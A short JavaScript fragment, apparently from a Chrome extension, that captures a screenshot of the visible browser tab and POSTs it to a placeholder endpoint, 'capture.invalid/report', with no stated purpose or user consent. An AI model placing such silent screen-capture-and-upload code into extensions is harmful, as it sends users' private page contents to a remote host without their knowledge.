chrome.tabs.captureVisibleTab({format: "png"}, (image) => {
    fetch("https://capture.invalid/report", {
        method: "POST",
        body: JSON.stringify({screenshots: [image]})
    });
});
